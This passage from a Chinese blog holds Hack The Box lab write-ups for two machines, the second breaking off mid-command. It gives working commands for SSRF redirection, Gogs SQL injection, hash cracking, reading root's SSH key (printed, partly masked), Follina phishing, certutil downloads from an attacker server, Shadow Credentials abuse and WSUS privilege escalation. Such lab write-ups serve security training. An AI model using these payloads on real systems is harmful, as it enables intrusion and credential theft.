/></p><p>80端口下并没有什么有价值的漏洞，一般来说这种webhook与前端交互的跳板服务器防护都做得很好，让我们有机可乘的是维护人员完全疏忽了跳板服务器与内部服务器之间交互的防护层，所以我们主要是<code>SSRF Redirect</code>来访问3000端口，看看上面是什么服务</p><p>参考<a href="https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery#ssrf-redirect-to-gopher">SSRF Redirect to Gopher</a></p><blockquote><p>访问我的伪造服务的时候，在跳板服务器访问的就是本地的<code>127.0.0.1:3000</code>上的服务</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> http.server <span class="keyword">import</span> HTTPServer, BaseHTTPRequestHandler</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Redirect</span>(<span class="title class_ inherited__">BaseHTTPRequestHandler</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">do_GET</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;DO GET&quot;</span>)</span><br><span class="line">        self.send_response(<span class="number">301</span>)</span><br><span class="line">        self.send_header(<span class="string">&quot;Location&quot;</span>, sys.argv[<span class="number">1</span>])</span><br><span class="line">        self.end_headers()</span><br><span class="line">httpd = HTTPServer((<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">80</span>), Redirect)</span><br><span class="line">httpd.serve_forever()</span><br></pre></td></tr></table></figure><p>要保证服务能够正常的发送请求，我们需要把<code>Under what circumstances should the webhook be sent?</code>这一栏选为Always</p><h3 id="listen-port"><a class="markdownIt-Anchor" href="#listen-port"></a> listen port</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lnvp 2710</span><br><span class="line">python3 redirect.py http://127.0.0.1:3000/</span><br></pre></td></tr></table></figure><blockquote><p>脚本起了一个跳板服务器本地重定向的作用</p></blockquote><p>能够在主机返回的json字段的body中返回3000服务的html样式字段，将其内容编码显示在浏览器中，这里需要处理一下转义字符，发现是一个Gogs服务，Version<code>0.5.5.1010</code>（这是一个漏洞执行可行版本）</p><h3 id="sql-injection"><a class="markdownIt-Anchor" href="#sql-injection"></a> SQL Injection</h3><p>searchsploit后发现Gogs有两个漏洞,接下来通过漏洞的PoC并且使用有效Payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># Get Passwd</span><br><span class="line">python3 redirect.py &quot;http://127.0.0.1:3000/api/v1/users/search?q=&#x27;)/**/union/**/all/**/select/**/1,1,(select/**/passwd/**/from/**/user),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1--&quot;</span><br><span class="line"></span><br><span class="line"># Get Salt</span><br><span class="line">python3 redirect.py &quot;http://127.0.0.1:3000/api/v1/users/search?q=&#x27;)/**/union/**/all/**/select/**/1,1,(select/**/salt/**/from/**/user),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1--&quot;</span><br></pre></td></tr></table></figure><p>Payload原理我也没去研究，直接套用PoC了</p><p>可以从服务器得到回应：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;body&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&#123;\&quot;data\&quot;:[&#123;\&quot;username\&quot;:\&quot;susanne\&quot;,\&quot;avatar\&quot;:\&quot;//1.gravatar.com/avatar/c11d48f16f254e918744183ef7b89fce\&quot;&#125;,&#123;\&quot;username\&quot;:\&quot;66c074645545781f1064fb7fd1177453db8f0ca2ce58a9d81c04be2e6d3ba2a0d6c032f0fd4ef83f48d74349ec196f4efe37\&quot;,\&quot;avatar\&quot;:\&quot;//1.gravatar.com/avatar/1\&quot;&#125;],\&quot;ok\&quot;:true&#125;&quot;</span></span><br></pre></td></tr></table></figure><p>要解密必须要知道gogs是怎么加密的，好在是个开源软件，在<code>internal/db/user.go</code>的文件下，有如下定义函数</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// EncodePassword encodes password to safe format.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(u *User)</span></span> EncodePassword() &#123;</span><br><span class="line">newPasswd := pbkdf2.Key([]<span class="type">byte</span>(u.Passwd), []<span class="type">byte</span>(u.Salt), <span class="number">10000</span>, <span class="number">50</span>, sha256.New)</span><br><span class="line">u.Passwd = fmt.Sprintf(<span class="string">&quot;%x&quot;</span>, newPasswd)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ValidatePassword checks if given password matches the one belongs to the user.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(u *User)</span></span> ValidatePassword(passwd <span class="type">string</span>) <span class="type">bool</span> &#123;</span><br><span class="line">newUser := &amp;User&#123;Passwd: passwd, Salt: u.Salt&#125;</span><br><span class="line">newUser.EncodePassword()</span><br><span class="line"><span class="keyword">return</span> subtle.ConstantTimeCompare([]<span class="type">byte</span>(u.Passwd), []<span class="type">byte</span>(newUser.Passwd)) == <span class="number">1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于pbkdf2的加密标准定义</p><ul><li>DK = PBKDF2(PRF, Password, Salt, c, dkLen)<ol><li>PRF，伪随机数</li><li>passwd，口令</li><li>c迭代次数</li><li>dkLen 密匙输出长度</li></ol></li></ul><p><a href="https://john-users.openwall.narkive.com/giDMyLS3/using-pbkdf2-hmac-sha256/">Crack PBKDF2-HMAC-SHA256 password</a></p><p><a href="https://github.com/hashcat/hashcat/issues/1583">More Questions</a></p><p>关于这方面的资料我读得头皮发麻，salt是默认二进制，但是passwd是十六进制格式保存在数据库</p><p>转化为可用于破解工具的格式：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;sha256\$10000$&quot;</span>$(<span class="built_in">echo</span> <span class="string">&#x27;sO3XIbeW14&#x27;</span>|<span class="built_in">base64</span>|<span class="built_in">cut</span> -c1-14)<span class="string">&quot;$&quot;</span>$(<span class="built_in">echo</span> <span class="string">&#x27;66c074645545781f1064fb7fd1177453db8f0ca2ce58a9d81c04be2e6d3ba2a0d6c032f0fd4ef83f48d74349ec196f4efe37&#x27;</span>|xxd -r -ps|<span class="built_in">base64</span>) &gt; susanne_crack.txt</span><br><span class="line"></span><br><span class="line">hashcat -m 10900 susanne_crack.txt /usr/share/wordlist/rockyou.txt</span><br></pre></td></tr></table></figure><blockquote><p>从字典遍历出密码<code>february15</code></p></blockquote><h3 id="logon-with-susanne"><a class="markdownIt-Anchor" href="#logon-with-susanne"></a> logon with susanne</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh susanne@health.htb</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">cat</span> user.txt</span><br></pre></td></tr></table></figure><h2 id="get-root"><a class="markdownIt-Anchor" href="#get-root"></a> Get ROOT</h2><h3 id="pspy-process-snooping"><a class="markdownIt-Anchor" href="#pspy-process-snooping"></a> pspy process snooping</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -c cd /var/www/html &amp;&amp; php artisan schedule:run &gt;&gt; /dev/null 2&gt;&amp;1                                                </span><br><span class="line">2022/09/21 04:53:01 CMD: UID=0    PID=8017   | /bin/bash -c sleep 5 &amp;&amp; /root/meta/clean.sh                                                               </span><br><span class="line">2022/09/21 04:53:01 CMD: UID=0    PID=8016   | /usr/sbin/CRON -f </span><br><span class="line">2022/09/21 04:53:01 CMD: UID=0    PID=8015   | /usr/sbin/CRON -f </span><br><span class="line">2022/09/21 04:53:02 CMD: UID=0    PID=8026   | </span><br><span class="line">2022/09/21 04:53:02 CMD: UID=0    PID=8024   | sh -c stty -a | grep columns </span><br><span class="line">2022/09/21 04:53:06 CMD: UID=0    PID=8028   | mysql laravel --execute TRUNCATE tasks</span><br></pre></td></tr></table></figure><h3 id="connect-to-mysql"><a class="markdownIt-Anchor" href="#connect-to-mysql"></a> connect to mysql</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> /var/www/html</span><br><span class="line">$ <span class="built_in">cat</span> .<span class="built_in">env</span>|grep DB</span><br><span class="line">DB_CONNECTION=mysql</span><br><span class="line">DB_HOST=127.0.0.1</span><br><span class="line">DB_PORT=3306</span><br><span class="line">DB_DATABASE=laravel</span><br><span class="line">DB_USERNAME=laravel</span><br><span class="line">DB_PASSWORD=MYsql_strongestpass@2014+</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$ mysql -D laravel -u laravel -pMYsql_strongestpass@2014+</span><br><span class="line"></span><br><span class="line"><span class="comment"># 默认进入的laravel数据库</span></span><br><span class="line">mysql&gt; show tables;</span><br><span class="line">mysql&gt; desc tasks;</span><br><span class="line">+--------------+--------------+------+-----+---------+-------+</span><br><span class="line">| Field        | Type         | Null | Key | Default | Extra |</span><br><span class="line">+--------------+--------------+------+-----+---------+-------+</span><br><span class="line">| <span class="built_in">id</span>           | char(36)     | NO   | PRI | NULL    |       |</span><br><span class="line">| webhookUrl   | varchar(255) | NO   |     | NULL    |       |</span><br><span class="line">| onlyError    | tinyint(1)   | NO   |     | NULL    |       |</span><br><span class="line">| monitoredUrl | varchar(255) | NO   |     | NULL    |       |</span><br><span class="line">| frequency    | varchar(255) | NO   |     | NULL    |       |</span><br><span class="line">| created_at   | timestamp    | YES  |     | NULL    |       |</span><br><span class="line">| updated_at   | timestamp    | YES  |     | NULL    |       |</span><br><span class="line">+--------------+--------------+------+-----+---------+-------+</span><br></pre></td></tr></table></figure><p>找到monitorUrl相关代码页面</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> /var/www/html</span><br><span class="line">$ find app/ -<span class="built_in">type</span> f -name <span class="string">&quot;*.php&quot;</span> -<span class="built_in">exec</span> <span class="built_in">cat</span> &#123;&#125; \;|grep monitoredUrl</span><br><span class="line"></span><br><span class="line"><span class="comment"># 可以注意到有以下几个内容值得注意</span></span><br><span class="line"><span class="variable">$res</span> = @file_get_contents(<span class="variable">$monitoredUrl</span>, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure><p><code>file_get_contents</code>获取文件内容</p><h3 id="port-my-listen"><a class="markdownIt-Anchor" href="#port-my-listen"></a> port my listen</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lnvp 2710</span><br></pre></td></tr></table></figure><h3 id="create-fake-webhook"><a class="markdownIt-Anchor" href="#create-fake-webhook"></a> create fake webhook</h3><p>Payload URL填写<br /><img src="/pictures/monitor_set.png" alt="content_text" /></p><p><code>Monitored URL</code>内容可以随意填写，反正后面也要在数据库中改为file协议读取ssh认证文件</p><p>MYSQL操作部分：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from tasks;</span><br><span class="line">mysql&gt; update tasks set monitoredUrl=&#x27;file:///root/.ssh/id_rsa&#x27;; </span><br></pre></td></tr></table></figure><h3 id="format-print"><a class="markdownIt-Anchor" href="#format-print"></a> format print</h3><p>由于输出的json文件中，内容文件是带有转义符号的，一个比较简单的方法就是将内容粘贴到python，用自带的print格式化再替换掉<code>\</code>就可以作为可用文本了</p><p>authentication_id_rsa:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">MIIEowIBAAKCAQEAwddD+eMlmkBmuU77LB0LfuVNJMam9/jG5NPqc2TfW4Nlj9gE</span><br><span class="line">KScDJTrF0vXYnIy4yUwM4/2M31zkuVI007ukvWVRFhRYjwoEPJQUjY2s6B0ykCzq</span><br><span class="line">IMFxjreovi1DatoMASTI9Dlm85mdL+rBIjJwfp+Via7ZgoxGaFr0pr8xnNePuHH/</span><br><span class="line">KuigjMqEn0k6C3EoiBGmEerr1BNKDBHNvdL/XP1hN4B7egzjcV8Rphj6XRE3bhgH</span><br><span class="line">7so4Xp3Nbro7H7IwIkTvhgy61bSUIWrTdqKP3KPKxua+TqUqyWGNksmK7bYvzhh8</span><br><span class="line">W6KAhfnHTO+ppIVqzmam4qb****DjJgs6ZwHiQIDAQABAoIBAEQ8IOOwQCZikUae</span><br><span class="line">NPC8cLWExnkxrMkRvAIFTzy7v5yZToEqS5yo7QSIAedXP58sMkg6Czeeo55lNua9</span><br><span class="line">t3bpUP6S0c5x7xK7Ne6VOf7yZnF3BbuW8/v/3Jeesznu+RJ+G0ezyUGfi0wpQRoD</span><br><span class="line">C2WcV9lbF+rVsB+yfX5ytjiUiURqR8G8wRYI/GpGyaCnyHmb6gLQg6Kj+xnxw6Dl</span><br><span class="line">hnqFXpOWB771WnW9yH7/IU9Z41t5tMXtYwj0pscZ5+XzzhgXw1y1x/LUyan++D+8</span><br><span class="line">efiWCNS3yeM1ehMgGW9SFE+VMVDPM6CIJXNx1YPoQBRYYT0lwqOD1UkiFwDbOVB2</span><br><span class="line">1bLlZQECgYEA9iT13rdKQ/zMO6wuqWWB2GiQ47EqpvG8Ejm0qhcJivJbZCxV2kAj</span><br><span class="line">nVhtw6NRFZ1Gfu21kPTCUTK34iX/p/doSsAzWRJFqqwrf36LS56OaSoeYgSFhjn3</span><br><span class="line">sqW7LTBXGuy0vvyeiKVJsNVNhNOcTKM5LY5NJ2+mOaryB2Y3aUaSKdECgYEAyZou</span><br><span class="line">fEG0e7rm3z++bZE5YFaaaOdhSNXbwuZkP4DtQzm78Jq5ErBD+a1af2hpuCt7+d1q</span><br><span class="line">0ipOCXDSsEYL9Q2i1KqPxYopmJNvWxeaHPiuPvJA5Ea5wZV8WWhuspH3657nx8ZQ</span><br><span class="line">zkbVWX3JRDh4vdFOBGB/ImdyamXURQ72Xhr7ODkCgYAOYn6T83Y9nup4mkln0OzT</span><br><span class="line">rti41cO+WeY50nGCdzIxkpRQuF6UEKeELITNq****agDBvVTcVph0Gr6pmnYcRcB</span><br><span class="line">N1ZI4E59+O3Z15VgZ/W+o51+8PC0tXKKWDEmJOsSQb8WYkEJj09NLEoJdyxtNiTD</span><br><span class="line">SsurgFTgjeLzF8ApQNyN4QKBgGBO854QlXP2WYyVGxekpNBNDv7GakctQwrcnU9o</span><br><span class="line">++99iTbr8zXmVtLT6cOr0bVVsKgxCnLUGuuPplbnX5b1qLAHux8XXb+xzySpJcpp</span><br><span class="line">UnRnrnBfCSZdj0X3CcrsyI8bHoblSn0AgbN6z8dzYtrrPmYA4ztAR/xkIP/Mog1a</span><br><span class="line">vmChAoGBAKcW+e5kDO1OekLdfvqYM5sHcA2le5KKsDzzsmboGEA4ULKjwnOXqJEU</span><br><span class="line">6dDHn+VY+LXGCv24IgDN6S78PlcB5acrg6m7OwDyPvXqGrNjvTDEY94BeC/cQbPm</span><br><span class="line">QeA60hw935eFZvx1Fn+mTaFvYZFMRMpmERTWOBZ53GTHjSZQoS3G</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br><span class="line"></span><br><span class="line">ssh root@health.htb -i auth_id_rsa</span><br><span class="line"></span><br><span class="line">cat /root/root.txt</span><br></pre></td></tr></table></figure><h2 id="summary"><a class="markdownIt-Anchor" href="#summary"></a> Summary</h2><p>root获取部分只要再前面理解了User的过程，再从<code>/var/www/html</code>中找到db的账号和密码就不难获取了，有意思的盒子</p>]]></content>
      
      
      <categories>
          
          <category> Machine </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE-2014-8682 </tag>
            
            <tag> pspy </tag>
            
            <tag> Webhook </tag>
            
            <tag> Databases </tag>
            
            <tag> SSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTB Outdated Machine Challenge</title>
      <link href="/2022/09/15/htb-outdated/"/>
      <url>/2022/09/15/htb-outdated/</url>
      
        <content type="html"><![CDATA[<h2 id="get-btables-user"><a class="markdownIt-Anchor" href="#get-btables-user"></a> Get btables user</h2><blockquote><p>一切开始之前都必须要将需要的域名添加到<code>/etc/hosts</code></p></blockquote><h3 id="get-information-in-shares"><a class="markdownIt-Anchor" href="#get-information-in-shares"></a> get information in shares</h3><p><code>smbmap</code>发现我们在shares盘是有权限访问的，文件夹里面有一个公告文件，打开<code>NOC_Reminder.pdf</code>，文件部分原文</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">As we work to rebuild, please assist our NOC by e-mailing a link to any internal web applications to</span><br><span class="line">itsupport@outdated.htb so we can get them added back into our monitoring platform for alerts and notifications.</span><br></pre></td></tr></table></figure><p>可以发现itsupport@outdated.htb可以发送内部应用程序的链接，通过添加到嗅探器来提示</p><h3 id="download-follina-from-github"><a class="markdownIt-Anchor" href="#download-follina-from-github"></a> download follina from github</h3><p><a href="https://github.com/JohnHammond/msdt-follina">Github Link</a>,这是对CVE-2022-30190的PoC但也可以直接来exploit本机器，下载下来后阅读说明方法。</p><blockquote><p>机器的邮件探测这一部分我个人认为是有大问题的，不管我是发送文本内容<code>http://10.10.XX.XX:8000/</code>(8000默认端口)，还是<code>http://10.10.XX.XX/</code>,都只能在本地监听80端口上得到相应，我初步怀疑是机器的适配没有做好。所以我改变了本地服务器监听端口并且更改了follina默认8000端口为80端口以更好地让机器添加正确的内部应用程序链接来触发漏洞。</p></blockquote><p>需要编辑脚本将<code>nc64</code>的下载链接替换为你本地下载服务器链接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8080</span><br><span class="line">python3 follina.py -p 80 -i tun0 -r 2710</span><br></pre></td></tr></table></figure><h3 id="pentest-smtp-port-using-telnet"><a class="markdownIt-Anchor" href="#pentest-smtp-port-using-telnet"></a> pentest smtp port using telnet</h3><p>接下来发送邮件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">telnet mail.outdated.htb 25</span><br><span class="line">Trying 10.10.11.175...</span><br><span class="line">Connected to outdated.htb.</span><br><span class="line">Escape character is &#x27;^]&#x27;.</span><br><span class="line">220 mail.outdated.htb ESMTP</span><br><span class="line">ehlo kali</span><br><span class="line">250-mail.outdated.htb</span><br><span class="line">250-SIZE 20480000</span><br><span class="line">250-AUTH LOGIN</span><br><span class="line">250 HELP</span><br><span class="line">mail from:&lt;kali@test&gt;</span><br><span class="line">250 OK</span><br><span class="line">rcpt to:&lt;itsupport@outdated.htb&gt;</span><br><span class="line">250 OK</span><br><span class="line">data</span><br><span class="line">354 OK, send.</span><br><span class="line">to: itsupport@outdated.htb</span><br><span class="line">from kali@test</span><br><span class="line">subject: test title</span><br><span class="line"></span><br><span class="line">http://10.10.XX.XX/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.</span><br><span class="line">250 Queued (30.006 seconds)</span><br><span class="line">quit</span><br><span class="line">221 goodbye</span><br><span class="line">Connection closed by foreign host.</span><br></pre></td></tr></table></figure><h3 id="pentest-smtp-using-swaskrecommend"><a class="markdownIt-Anchor" href="#pentest-smtp-using-swaskrecommend"></a> pentest smtp using swask{recommend}</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">swaks --to itsupport@outdated.htb --from kali@test --server mail.outdated.htb --body &quot;http://10.10.XX.XX/&quot;</span><br></pre></td></tr></table></figure><h2 id="get-domain-info"><a class="markdownIt-Anchor" href="#get-domain-info"></a> Get Domain-Info</h2><h3 id="pre-knowledge"><a class="markdownIt-Anchor" href="#pre-knowledge"></a> pre knowledge</h3><p>Active Directory: <a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology">Click Me</a></p><p>Kerberos Working Process: <a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberos-authentication">Click Me</a></p><p>Basic CMD for pentesters:(Domain Section) <a href="https://book.hacktricks.xyz/windows-hardening/basic-cmd-for-pentesters#domain-info">Click Me</a></p><p>BloodHound: <a href="https://bloodhound.readthedocs.io/en/latest/index.html">Click Me</a></p><h3 id="infomation"><a class="markdownIt-Anchor" href="#infomation"></a> Infomation</h3><p>在一切之前我们需要获取一些基本的domain信息</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$</span>:net user /domain</span><br><span class="line">The request will be processed at a domain controller <span class="keyword">for</span> domain outdated.htb.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">User accounts <span class="keyword">for</span> \\DC.outdated.htb</span><br><span class="line"></span><br><span class="line"><span class="literal">-------------------------------------------------------------------------------</span></span><br><span class="line">Administrator            btables                  Guest                    </span><br><span class="line">krbtgt                   sflowers                 </span><br><span class="line">The command completed successfully.</span><br></pre></td></tr></table></figure><p>可以看到一下是 <code>\\DC.outdated.htb</code>的用户列表，我们需要做的是从btables用户登录到目标计算机</p><h3 id="bloodhound-time"><a class="markdownIt-Anchor" href="#bloodhound-time"></a> BloodHound time!</h3><p>用BloodHound扫描一下，发现了可行路径：<br /><img src="/pictures/btables_outdated_htb_bloodhound.png" alt="way_to_dc_outdated_htb" /></p><p>图像很明了就不分析了</p><h2 id="takeover-sflowers"><a class="markdownIt-Anchor" href="#takeover-sflowers"></a> Takeover sflowers</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The members of the group ITSTAFF@OUTDATED.HTB have the ability to write to the &quot;msds-KeyCredentialLink&quot; property on SFLOWERS@OUTDATED.HTB. Writing to this property allows an attacker to create &quot;Shadow Credentials&quot; on the object and authenticate as the principal using kerberos PKINIT.</span><br></pre></td></tr></table></figure><p>这里需要用到的是<code>Shadow Credentials</code>技术</p><ul><li>阅读<a href="https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab">这篇文章</a></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># Upload Files</span><br><span class="line">certutil.exe -urlcache -f http://&#123;your_server&#125;/&#123;file_name&#125; &#123;file_name&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Abuse &quot;AddKeyCredentials&quot; privilege</span><br><span class="line">Whisker.exe add /target:sflowers</span><br><span class="line"></span><br><span class="line"># Enter home</span><br><span class="line">Rubeus.exe asktgt /user:sflowers /certificate:&lt;your_base64_cert&gt; /password:&quot;FXqY4qoqtORvgmC9&quot; /domain:outdated.htb /dc:DC.outdated.htb /getcredentials /show</span><br><span class="line">evil-winrm -i outdated.htb -u sflowers -H 1FCDB1F6015DCB318CC77BB2BDA14DB5</span><br></pre></td></tr></table></figure><h2 id="into-root"><a class="markdownIt-Anchor" href="#into-root"></a> Into ROOT</h2><h3 id="local-privilege-escalation-detect"><a class="markdownIt-Anchor" href="#local-privilege-escalation-detect"></a> local privilege escalation detect</h3><p>这里需要用到<code>PEASS-ng</code>，来进行本地提权检测，不得不说这个软件在应付常规提权是真的好用！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># Upload File</span><br><span class="line"># run winPEAS.exe</span><br><span class="line">Checking WSUS............</span><br><span class="line">https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#wsus</span><br><span class="line">WSUS is using http: http://wsus.outdated.htb:8530</span><br><span class="line">You can test https://github.com/pimps/wsuxploit to escalate privileges</span><br><span class="line">And UseWUServer is equals to 1, so it is vulnerable!</span><br></pre></td></tr></table></figure><h3 id="compile-wsuspicious-to-binary"><a class="markdownIt-Anchor" href="#compile-wsuspicious-to-binary"></a> compile WSuspicious to binary</h3><p>仓库并没有直接发布二进制版本，很多C# 的工具都需要我们自己编译，首先编译然后上传</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># compile</span><br><span class="line">dotnet msbuild /t:Restore /t:Clean /t:Build /p:Configuration=Release /p:DebugSymbols=false /p:DebugType=None /t:ILMerge /p:TrimUnusedDependencies=true</span><br></pre></td></tr></table></figure><blockquote><p>千万不要现在最新版的visual studio来编译！不然等着踩坑，推荐2019</p></blockquote><h3 id="hack-root"><a class="markdownIt-Anchor" href="#hack-root"></a> hack root</h3><p>详细参见：<a href="https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/">WSUSATtack</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># run custom command line</span><br><span class="line">./WSuspicious.exe /command:&quot; -accepteula -s -d cmd /c &quot;&quot;net localgroup Administrators sflowers /add&quot;&quot;&quot; /autoinstall</span><br></pre></td></tr></table></figure><p>这里试了很久都不行，也许是服务器禁用了本地代理？</p><h3 id="sharp-my-weapon"><a class="markdownIt-Anchor" href="#sharp-my-weapon"></a> sharp my weapon</h3><p>还在维护中的工具: <a href="https://github.com/nettitude/SharpWSUS">Github</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># create update</span><br><span class="line">./SharpWsus.exe create /payload:&quot;C:\Users\sflowers\Documents\psexec.exe&quot; /args:&quot;-accepteula -s -d cmd.exe /c net localgroup administrators sflowers /add&quot; /title:&quot;update released&quot;</span><br><span class="line"></span><br><span class="line"># apply update</span><br><span class="line">./SharpWsus.exe approve /updateid:&#123;update_code&#125; 